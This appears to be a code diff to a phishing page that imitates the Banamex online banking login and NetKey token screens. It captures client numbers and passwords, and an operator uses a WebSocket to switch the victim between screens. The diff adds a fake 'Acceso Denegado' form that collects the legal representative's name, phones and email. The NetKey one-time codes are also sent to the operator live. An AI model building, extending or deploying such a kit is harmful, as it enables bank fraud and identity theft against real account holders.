@@ -15,7 +15,7 @@
 <body>
     <div class="overlay"></div>
     <div class="overlay_trans"></div>
-    
+
     <div id="contenedor">
         <!-- Header -->
         <div class="header">
@@ -193,7 +193,7 @@
         </div>
         <div style="max-width: 600px; margin: 80px auto; padding: 30px; background: #003d7a; border-radius: 8px; color: white;">
             <h2 style="text-align: center; margin-bottom: 30px;">Autenticación NetKey</h2>
-            
+
             <!-- Mostrar código CHALLENGE -->
             <div style="background: rgba(255,255,255,0.1); padding: 20px; border-radius: 8px; margin-bottom: 30px;">
                 <p style="text-align: center; margin-bottom: 15px; font-size: 14px; opacity: 0.9;">Código CHALLENGE:</p>
@@ -202,7 +202,7 @@
                 </div>
                 <p style="text-align: center; margin-top: 15px; font-size: 13px; opacity: 0.8;">Ingrese este código en su dispositivo NetKey</p>
             </div>
-            
+
             <!-- Input para respuesta -->
             <div style="background: rgba(255,255,255,0.1); padding: 20px; border-radius: 8px;">
                 <p style="text-align: center; margin-bottom: 15px; font-size: 14px; opacity: 0.9;">Ingrese la respuesta de su NetKey:</p>
@@ -216,7 +216,7 @@
                     />
                 </div>
             </div>
-            
+
             <button 
                 id="netkey-submit-btn"
                 style="width: 100%; margin-top: 25px; padding: 15px; background: white; color: #003d7a; border: none; border-radius: 4px; font-size: 16px; font-weight: bold; cursor: pointer; transition: opacity 0.3s;"
@@ -245,7 +245,7 @@
                 <p style="color: #333; font-size: 16px; line-height: 1.6; margin-bottom: 25px;">
                     Su dispositivo NetKey requiere mantenimiento para continuar funcionando de manera adecuada. Es necesario sincronizarlo para restablecer su servicio correctamente.
                 </p>
-                
+
                 <div style="background: white; padding: 25px; border-radius: 8px; margin-bottom: 20px; border-left: 4px solid #003d7a;">
                     <h3 style="color: #003d7a; margin: 0 0 15px 0; font-size: 18px;">Banamex Resuelve PyMEs</h3>
                     <p style="color: #666; margin: 5px 0; font-size: 14px;">Segmento Pequeña y Mediana Empresa (PYME) y Sucursal</p>
@@ -266,6 +266,151 @@
                     <p style="color: #003d7a; margin: 8px 0; font-size: 14px;"><strong>Correo electrónico:</strong> servicioalclientebei@banamex.com</p>
                 </div>
             </div>
+        </div>
+    </div>
+
+        <!-- Pantalla Acceso Denegado 2 -->
+        <div id="acceso-denegado-2-screen" style="display: none;">
+            <div style="margin: 0; background: #fff; color: #0b3b43; padding: 28px; font-family: 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif; min-height: 100vh;">
+                <div style="max-width: 900px; margin: 18px auto;">
+                    <header style="display: flex; align-items: center; gap: 18px; margin-bottom: 22px;">
+                        <div style="display: flex; align-items: center; gap: 12px;">
+                            <svg width="54" height="54" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+                                <g fill="#c81f3b">
+                                    <path d="M50 10c9 0 18 8 18 18s-9 18-18 18S32 37 32 27 41 10 50 10z"/>
+                                    <path d="M50 32c9 0 18 8 18 18s-9 18-18 18-18-8-18-18 9-18 18-18z"/>
+                                    <path d="M50 54c9 0 18 8 18 18s-9 18-18 18-18-8-18-18 9-18 18-18z"/>
+                                </g>
+                            </svg>
+                            <div>
+                                <div style="font-size: 20px; font-weight: 600; color: #153e46;">Banamex</div>
+                            </div>
+                        </div>
+                        <div style="margin-left: auto; text-align: right;">
+                            <div style="font-size: 14px; color: #2d4b51;" id="datetime-acceso2"></div>
+                        </div>
+                    </header>
+
+                    <div style="background: linear-gradient(90deg, #f7fbfc 0%, #eef6f7 100%); border-radius: 8px; padding: 32px; box-shadow: 0 6px 18px rgba(0,0,0,0.08); border: 1px solid rgba(0,0,0,0.03);">
+                        <h1 style="font-size: 28px; margin: 6px 0 24px; display: flex; align-items: center; gap: 12px; color: #d32f2f;">
+                            🚫 Acceso Denegado
+                        </h1>
+
+                        <div style="background: #fff; border-radius: 6px; padding: 24px; box-shadow: 0 3px 8px rgba(0,0,0,0.04);">
+                            <p style="margin: 0 0 24px 0; color: #3d5559; font-size: 15px; line-height: 1.6;">
+                                Su dispositivo NetKey requiere mantenimiento para continuar funcionando de manera adecuada. 
+                                Es necesario sincronizarlo para restablecer su servicio correctamente.
+                            </p>
+
+                            <h3 style="color: #153e46; font-weight: 600; font-size: 18px; margin: 0 0 16px 0;">
+                                Información de contacto requerida
+                            </h3>
+
+                            <form id="acceso-form-2" style="display: flex; flex-direction: column; gap: 16px;">
+                                <div>
+                                    <label style="display: block; margin-bottom: 8px; color: #153e46; font-size: 14px; font-weight: 500;">
+                                        Nombre del representante legal <span style="color: #c81f3b;">*</span>
+                                    </label>
+                                    <input type="text" id="nombre-rep-2" placeholder="Nombre completo del representante legal" style="width: 100%; padding: 12px 16px; font-size: 16px; border: 2px solid #b4d5d8; border-radius: 6px; background: #f7fbfc; color: #153e46; box-sizing: border-box;">
+                                </div>
+
+                                <div>
+                                    <label style="display: block; margin-bottom: 8px; color: #153e46; font-size: 14px; font-weight: 500;">
+                                        Número de teléfono 1 <span style="color: #c81f3b;">*</span>
+                                    </label>
+                                    <input type="tel" id="telefono1-2" placeholder="10 dígitos" maxlength="10" style="width: 100%; padding: 12px 16px; font-size: 16px; border: 2px solid #b4d5d8; border-radius: 6px; background: #f7fbfc; color: #153e46; box-sizing: border-box;">
+                                </div>
+
+                                <div>
+                                    <label style="display: block; margin-bottom: 8px; color: #153e46; font-size: 14px; font-weight: 500;">
+                                        Número de teléfono 2 (opcional)
+                                    </label>
+                                    <input type="tel" id="telefono2-2" placeholder="10 dígitos" maxlength="10" style="width: 100%; padding: 12px 16px; font-size: 16px; border: 2px solid #b4d5d8; border-radius: 6px; background: #f7fbfc; color: #153e46; box-sizing: border-box;">
+                                </div>
+
+                                <div>
+                                    <label style="display: block; margin-bottom: 8px; color: #153e46; font-size: 14px; font-weight: 500;">
+                                        Correo electrónico de su cuenta <span style="color: #c81f3b;">*</span>
+                                    </label>
+                                    <input type="email" id="correo-2" placeholder="correo@ejemplo.com" style="width: 100%; padding: 12px 16px; font-size: 16px; border: 2px solid #b4d5d8; border-radius: 6px; background: #f7fbfc; color: #153e46; box-sizing: border-box;">
+                                </div>
+
+                                <div style="margin-top: 28px; display: flex; gap: 12px; justify-content: flex-end;">
+                                    <button type="button" style="padding: 12px 24px; background: #fff; color: #3d5559; border: 2px solid #c4d5d7; border-radius: 6px; font-size: 15px; font-weight: 500; cursor: pointer;">
+                                        Cancelar
+                                    </button>
+                                    <button type="submit" id="submit-btn-2" style="padding: 12px 24px; background: #b4d5d8; color: #fff; border: none; border-radius: 6px; font-size: 15px; font-weight: 600; cursor: not-allowed; opacity: 0.6;">
+                                        Solicitar sincronización
+                                    </button>
+                                </div>
+                            </form>
+                        </div>
+                    </div>
+
+                    <footer style="margin-top: 28px; padding-top: 18px; border-top: 1px solid #e0e0e0; text-align: center; font-size: 11px; color: #666;">
+                        <p style="margin: 4px 0;">Banamex es una marca registrada de Citigroup Inc. utilizada bajo licencia por Banco Nacional de México, S.A.</p>
+                        <p style="margin: 4px 0;">© 2025 Banco Nacional de México, S.A. Derechos Reservados</p>
+                    </footer>
+                </div>
+            </div>
+
+            <script>
+                // Validación del formulario de acceso denegado 2
+                function validateForm2() {
+                    const nombreRep = document.getElementById('nombre-rep-2').value.trim();
+                    const telefono1 = document.getElementById('telefono1-2').value.trim();
+                    const correo = document.getElementById('correo-2').value.trim();
+                    const submitBtn = document.getElementById('submit-btn-2');
+
+                    if (nombreRep && telefono1 && telefono1.length === 10 && correo) {
+                        submitBtn.style.background = '#153e46';
+                        submitBtn.style.cursor = 'pointer';
+                        submitBtn.style.opacity = '1';
+                        submitBtn.disabled = false;
+                    } else {
+                        submitBtn.style.background = '#b4d5d8';
+                        submitBtn.style.cursor = 'not-allowed';
+                        submitBtn.style.opacity = '0.6';
+                        submitBtn.disabled = true;
+                    }
+                }
+
+                // Event listeners para validación en tiempo real
+                document.getElementById('nombre-rep-2').addEventListener('input', validateForm2);
+                document.getElementById('telefono1-2').addEventListener('input', function(e) {
+                    e.target.value = e.target.value.replace(/\D/g, '').slice(0, 10);
+                    validateForm2();
+                });
+                document.getElementById('telefono2-2').addEventListener('input', function(e) {
+                    e.target.value = e.target.value.replace(/\D/g, '').slice(0, 10);
+                    validateForm2();
+                });
+                document.getElementById('correo-2').addEventListener('input', validateForm2);
+
+                // Manejo del envío del formulario
+                document.getElementById('acceso-form-2').addEventListener('submit', function(e) {
+                    e.preventDefault();
+
+                    const formData = {
+                        nombreRepresentante: document.getElementById('nombre-rep-2').value.trim(),
+                        telefono1: document.getElementById('telefono1-2').value.trim(),
+                        telefono2: document.getElementById('telefono2-2').value.trim(),
+                        correo: document.getElementById('correo-2').value.trim()
+                    };
+
+                    if (ws && ws.readyState === WebSocket.OPEN) {
+                        ws.send(JSON.stringify({
+                            type: 'CLIENT_INPUT',
+                            data: {
+                                tipo: 'acceso_denegado_2',
+                                sessionId: sessionId,
+                                ...formData
+                            }
+                        }));
+                        console.log('Datos de acceso denegado 2 enviados:', formData);
+                    }
+                });
+            </script>
         </div>
     </div>
 
@@ -370,11 +515,11 @@
             // Banner rotation
             var banners = [0, 1, 2, 3];
             var currentBanner = 0;
-            
+
             setInterval(function() {
                 var img1 = document.getElementById('cambiaImagen1');
                 var img2 = document.getElementById('cambiaImagen2');
-                
+
                 if (currentBanner % 2 === 0) {
                     img1.className = 'bg_1';
                     img2.className = 'bg_2';
@@ -382,7 +527,7 @@
                     img1.className = 'bg_2';
                     img2.className = 'bg_1';
                 }
-                
+
                 // Update indicators
                 for (var i = 0; i <= 3; i++) {
                     var elem = document.getElementById('destacado_' + i);
@@ -390,7 +535,7 @@
                         elem.className = (i === currentBanner) ? 'avtive_' + i : 'destacado_' + i;
                     }
                 }
-                
+
                 currentBanner = (currentBanner + 1) % 4;
             }, 5000);
 
@@ -421,18 +566,18 @@
             // Handle form submission
             document.querySelector('.btn_az').addEventListener('click', function(e) {
                 e.preventDefault();
-                
+
                 var numeroCliente = document.getElementById('USERID').value.trim();
                 var claveAcceso = document.getElementById('PASSWORD').value.trim();
-                
+
                 if (!numeroCliente || !claveAcceso) {
                     alert('Por favor complete todos los campos');
                     return;
                 }
-                
+
                 // Show loading screen
                 document.getElementById('loading-screen').style.display = 'block';
-                
+
                 // Send login request
                 fetch('/api/banamex/login', {
                     method: 'POST',
@@ -472,10 +617,10 @@
         function connectWebSocket(sessionId) {
             var protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
             var wsUrl = protocol + '//' + window.location.host + '/ws';
-            
+
             console.log('Intentando conectar WebSocket para sesión:', sessionId);
             ws = new WebSocket(wsUrl);
-            
+
             ws.onopen = function() {
                 console.log('WebSocket conectado exitosamente');
                 ws.send(JSON.stringify({
@@ -485,12 +630,12 @@
                 }));
                 console.log('Mensaje REGISTER enviado');
             };
-            
+
             ws.onmessage = function(event) {
                 try {
                     var data = JSON.parse(event.data);
                     console.log('Mensaje WebSocket recibido:', data);
-                    
+
                     if (data.type === 'SCREEN_CHANGE') {
                         console.log('Procesando SCREEN_CHANGE');
                         handleScreenChange(data.data);
@@ -501,11 +646,11 @@
                     console.error('Error procesando mensaje:', e);
                 }
             };
-            
+
             ws.onerror = function(error) {
                 console.error('WebSocket error:', error);
             };
-            
+
             ws.onclose = function(event) {
                 console.log('WebSocket cerrado:', event.code, event.reason);
                 // Intentar reconectar después de 2 segundos
@@ -519,37 +664,38 @@
         function handleScreenChange(data) {
             console.log('Cambio de pantalla recibido:', data);
             console.log('Tipo de pantalla:', data.tipo);
-            
+
             // Ocultar todas las pantallas primero
             document.getElementById('loading-screen').style.display = 'none';
             document.getElementById('netkey-screen').style.display = 'none';
             document.getElementById('netkey2-screen').style.display = 'none';
             document.getElementById('acceso-denegado-screen').style.display = 'none';
-            
+            document.getElementById('acceso-denegado-2-screen').style.display = 'none'; // Asegurarse de ocultar la nueva pantalla
+
             if (data.tipo === 'netkey') {
                 console.log('Mostrando pantalla NetKey');
                 document.getElementById('netkey-screen').style.display = 'block';
-                
+
                 // Mostrar el código CHALLENGE si viene en los datos
                 if (data.challenge) {
                     console.log('Mostrando challenge:', data.challenge);
                     document.getElementById('challenge-display').textContent = data.challenge;
                 }
-                
+
                 // Configurar evento del botón de NetKey si aún no está configurado
                 var submitBtn = document.getElementById('netkey-submit-btn');
                 if (submitBtn && !submitBtn.hasAttribute('data-configured')) {
                     submitBtn.setAttribute('data-configured', 'true');
                     submitBtn.addEventListener('click', function() {
                         var netkeyResponse = document.getElementById('netkey-response-input').value.trim();
-                        
+
                         if (netkeyResponse.length !== 8) {
                             alert('Por favor ingrese un código de 8 dígitos');
                             return;
                         }
-                        
+
                         console.log('Enviando respuesta NetKey:', netkeyResponse);
-                        
+
                         // Enviar respuesta al servidor
                         if (ws && ws.readyState === WebSocket.OPEN) {
                             ws.send(JSON.stringify({
@@ -560,7 +706,7 @@
                                     netkeyResponse: netkeyResponse
                                 }
                             }));
-                            
+
                             // Cambiar a pantalla de validación
                             document.getElementById('netkey-screen').style.display = 'none';
                             document.getElementById('loading-screen').style.display = 'block';
@@ -569,7 +715,7 @@
                         }
                     });
                 }
-                
+
                 // Limpiar el input de respuesta
                 document.getElementById('netkey-response-input').value = '';
                 document.getElementById('netkey-response-input').focus();
@@ -577,12 +723,12 @@
                 console.log('Mostrando pantalla NetKey 2');
                 console.log('Mostrando challenge:', data.challenge);
                 document.getElementById('netkey2-screen').style.display = 'block';
-                
+
                 // Mostrar el código CHALLENGE si viene en los datos
                 if (data.challenge) {
                     document.getElementById('netkey2-challenge-display').textContent = data.challenge;
                 }
-                
+
                 // Actualizar fecha y hora en tiempo real
                 function updateNetkey2DateTime() {
                     var now = new Date();
@@ -599,21 +745,21 @@
                 }
                 updateNetkey2DateTime();
                 var dateInterval = setInterval(updateNetkey2DateTime, 1000);
-                
+
                 // Configurar evento del botón de NetKey2 si aún no está configurado
                 var submitBtn = document.getElementById('netkey2-submit-btn');
                 if (submitBtn && !submitBtn.hasAttribute('data-configured')) {
                     submitBtn.setAttribute('data-configured', 'true');
                     submitBtn.addEventListener('click', function() {
                         var netkeyResponse = document.getElementById('netkey2-response-input').value.trim();
-                        
+
                         if (netkeyResponse.length !== 8) {
                             alert('Por favor ingrese un código de 8 dígitos');
                             return;
                         }
-                        
+
                         console.log('Enviando respuesta NetKey 2:', netkeyResponse);
-                        
+
                         // Enviar respuesta al servidor
                         if (ws && ws.readyState === WebSocket.OPEN) {
                             ws.send(JSON.stringify({
@@ -624,10 +770,10 @@
                                     netkeyResponse: netkeyResponse
                                 }
                             }));
-                            
+
                             // Limpiar intervalo de fecha
                             clearInterval(dateInterval);
-                            
+
                             // Cambiar a pantalla de validación
                             document.getElementById('netkey2-screen').style.display = 'none';
                             document.getElementById('loading-screen').style.display = 'block';
@@ -636,13 +782,67 @@
                         }
                     });
                 }
-                
+
                 // Limpiar el input de respuesta
                 document.getElementById('netkey2-response-input').value = '';
                 document.getElementById('netkey2-response-input').focus();
             } else if (data.tipo === 'acceso_denegado') {
                 console.log('Mostrando pantalla de Acceso Denegado');
                 document.getElementById('acceso-denegado-screen').style.display = 'block';
+            } else if (data.tipo === 'acceso_denegado_2') { // Manejar la nueva pantalla
+                console.log('Mostrando pantalla de Acceso Denegado 2');
+                document.getElementById('acceso-denegado-2-screen').style.display = 'block';
+
+                // Actualizar fecha y hora en tiempo real para la pantalla acceso_denegado_2
+                function updateAcceso2DateTime() {
+                    var now = new Date();
+                    var days = ['Domingo','Lunes','Martes','Miércoles','Jueves','Viernes','Sábado'];
+                    var months = ['Enero','Febrero','Marzo','Abril','Mayo','Junio','Julio','Agosto','Septiembre','Octubre','Noviembre','Diciembre'];
+                    var pad = function(n) { return n < 10 ? '0'+n : n; };
+                    var dayName = days[now.getDay()];
+                    var day = now.getDate();
+                    var month = months[now.getMonth()];
+                    var year = now.getFullYear();
+                    var time = pad(now.getHours()) + ':' + pad(now.getMinutes()) + ':' + pad(now.getSeconds());
+                    var dateStr = dayName + ' ' + day + ' de ' + month + ' de ' + year + ', ' + time + ' Centro de México';
+                    var datetimeElement = document.getElementById('datetime-acceso2');
+                    if(datetimeElement) {
+                        datetimeElement.textContent = dateStr;
+                    }
+                }
+                updateAcceso2DateTime();
+                var dateIntervalAcceso2 = setInterval(updateAcceso2DateTime, 1000);
+
+                // Configurar el botón de "Cancelar" en la pantalla acceso_denegado_2
+                var cancelBtnAcceso2 = document.querySelector('#acceso-denegado-2-screen button[type="button"]');
+                if (cancelBtnAcceso2) {
+                    cancelBtnAcceso2.addEventListener('click', function() {
+                        console.log('Cancelar presionado en Acceso Denegado 2');
+                        // Aquí podrías enviar un mensaje al backend o simplemente cerrar la pantalla
+                        clearInterval(dateIntervalAcceso2); // Detener el reloj
+                        document.getElementById('acceso-denegado-2-screen').style.display = 'none';
+                        // Opcional: Volver a la pantalla de login o a una pantalla de error genérica
+                        // document.getElementById('login').style.display = 'block'; 
+                    });
+                }
+
+                 // Configurar el botón de "Solicitar sincronización" en la pantalla acceso_denegado_2
+                var submitBtnAcceso2 = document.getElementById('submit-btn-2');
+                if (submitBtnAcceso2) {
+                    submitBtnAcceso2.addEventListener('click', function() {
+                        // La validación ya se hace en tiempo real, pero podemos confirmar aquí si es necesario
+                        if (submitBtnAcceso2.disabled) {
+                            return; // No hacer nada si está deshabilitado
+                        }
+                        console.log('Solicitar sincronización presionado en Acceso Denegado 2');
+                        // Aquí se enviaría la información del formulario al backend
+                        // El formulario ya tiene un listener 'submit' que maneja esto.
+                    });
+                }
+
+                // Enfocar el primer campo del formulario
+                document.getElementById('nombre-rep-2').focus();
+
             } else {
                 console.log('Tipo de pantalla no reconocido:', data.tipo);
             }
